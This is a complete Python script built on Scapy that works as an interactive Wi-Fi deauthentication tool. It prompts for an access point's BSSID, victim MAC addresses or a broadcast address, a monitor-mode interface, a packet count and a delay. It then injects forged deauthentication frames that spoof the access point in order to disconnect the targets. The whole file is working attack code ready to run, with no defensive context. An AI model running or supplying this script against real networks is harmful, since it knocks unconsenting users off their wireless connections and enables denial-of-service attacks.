from scapy.all import *
from scapy.layers.dot11 import *

import time
import subprocess
import re
import getpass

#mac input helper function
def inputMAC(allow_empty=False):
    mac_regex = r'^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$'
    #two hex digits (HH) followed by 5 times (:HH) is a mac
    
    #repeat until proper input
    while True:
        mac_input = input()
        
        #Check regex and length for sanity
        if (re.match(mac_regex, mac_input) and len(mac_input) == 17) \
            or (mac_input == "" if allow_empty else False):
            break
        else:
            print("Please enter a valid MAC address.\n")
    
    return mac_input

def inputInt():
    while True:
        try:
            num = int(input())
            if not num > 0:
                raise ValueError("Integer must be greater than zero")
            break
        except:
            print("Input an integer greater than 0.")
    
    return num
            
def inputFloat():
    while True:
        try:
            num = float(input())
            if not num > 0:
                raise ValueError("Floating point number must be greater than zero")
            break
        except:
            print("Input a floating point number greater than 0.")
            
    return num
            
def victimListInput():
    ret_list = []
    while True:
        victim_MAC = inputMAC(True)
        bc_mode = victim_MAC.lower() == "ff:ff:ff:ff:ff:ff"
        if bc_mode:
            ret_list = ["ff:ff:ff:ff:ff:ff"]
            print("Mode set to broadcast.")
            break
        elif victim_MAC == "":
            break
        ret_list.append(victim_MAC)
        print("MAC added...")
    return ret_list

#MAIN --------------------------------------------------------------------------------------------------------

#Check for root
if not getpass.getuser() == "root":
    print("Please run the script as root.")
    quit()

print("DEAUTH UTILITY ----------------------------------------------------")
print("Before using, make sure your network adapter is capable of monitoring and packet injection.")
print("Ensure that drivers are properly installed.\n")


print("Enter BSSID of AP (Access Point) to which the victim(s) are connected\n")
print("Adhering to the following notation: \"HH:HH:HH:HH:HH:HH\" where H is a hexadecimal number\n")
ac_BSSID = inputMAC()

print("Enter MAC address of victims. (FF:FF:FF:FF:FF:FF for broadcast, press enter to stop inputting MACs)\n")
vic_MAC_list = victimListInput()

#keep track if it's a broadcast.
bc_mode = vic_MAC_list[0] == "ff:ff:ff:ff:ff:ff"

print("Enter name of interface you wish to use for injection.")
print("(Please note that the interface must be in monitor mode and capable of packet injection!)\n")
#Might want to check for proper interface input, or mode (subprocess)
net_iface = input()

print("Input how many packets you want to send.\n")
frame_count = inputInt()
print("Input delay between deauth frames in seconds.\n")
injection_delay = inputFloat()

print("About to inject " + str(frame_count) + " deauthetication frames as "
      + ac_BSSID + " to:\n" + '\n'.join(vic_MAC_list) + ("\n(broadcast) " if bc_mode else ""))
input("Press enter to continue...")

for count_iteration in range(frame_count):
    for mac in vic_MAC_list:
        #as sniffed in Scapy's interpreter, build the deauth packet.
        deauth_frame = RadioTap() / Dot11(subtype = 12, type = 0, addr1 = mac,
                                        addr2 = ac_BSSID, addr3 = ac_BSSID) / Dot11Deauth(reason = 7)
        sendp(deauth_frame, iface = net_iface, count = 1, verbose=False)
    print("Batch of " + str(len(vic_MAC_list)) + " deauth frames sent" + "."*(count_iteration%4))
    time.sleep(injection_delay)

print("Sent " + str(len(vic_MAC_list) * frame_count) + " deauthentication frames to:\n" + '\n'.join(vic_MAC_list))